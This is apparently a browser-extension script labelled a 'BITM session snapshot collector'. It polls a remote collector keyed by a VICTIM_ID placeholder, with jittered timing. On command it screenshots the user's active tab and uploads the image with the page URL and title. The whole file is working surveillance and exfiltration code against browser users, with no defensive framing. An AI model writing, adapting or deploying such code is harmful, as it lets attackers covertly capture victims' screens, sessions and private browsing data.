const COLLECTOR_URL = 'http://127.0.0.1:8080/VICTIM_ID';
const POLL_INTERVAL_MS = 3000;
const POLL_JITTER_MS = 750;

let lastHandledRequestId = null;
let pollTimer = null;

async function fetchPendingSnapshotRequest() {
  const response = await fetch(`${COLLECTOR_URL}/snapshot-requests`, {
    method: 'GET'
  });
  if (!response.ok) {
    throw new Error(`snapshot-requests returned ${response.status}`);
  }
  const data = await response.json();
  const pending = Array.isArray(data.pending) ? data.pending : [];
  return pending.length > 0 ? pending[0] : null;
}

async function captureActiveTab(requestId) {
  const tabs = await browser.tabs.query({ active: true, currentWindow: true });
  const tab = tabs[0];
  if (!tab) {
    throw new Error('No active tab to capture');
  }

  const image = await browser.tabs.captureVisibleTab(tab.windowId, {
    format: 'png'
  });

  const response = await fetch(`${COLLECTOR_URL}/snapshot`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      request_id: requestId,
      image: image,
      url: tab.url || '',
      title: tab.title || ''
    })
  });
  if (!response.ok) {
    throw new Error(`snapshot upload returned ${response.status}`);
  }

  console.log(`✅ Session snapshot delivered: ${requestId} (${tab.url || 'unknown url'})`);
}

async function pollSnapshotRequests() {
  try {
    const request = await fetchPendingSnapshotRequest();
    if (request && request.id !== lastHandledRequestId) {
      try {
        await captureActiveTab(request.id);
        lastHandledRequestId = request.id;
      } catch (error) {
        // Leave the request unhandled so the next poll retries the capture.
        console.error(`❌ Failed to deliver snapshot ${request.id}:`, error);
      }
    }
  } catch (error) {
    console.error('Failed to poll snapshot requests:', error);
  } finally {
    pollTimer = setTimeout(
      pollSnapshotRequests,
      POLL_INTERVAL_MS + Math.floor(Math.random() * POLL_JITTER_MS)
    );
  }
}

pollTimer = setTimeout(pollSnapshotRequests, POLL_INTERVAL_MS);

console.log('🟢 BITM session snapshot collector ready');
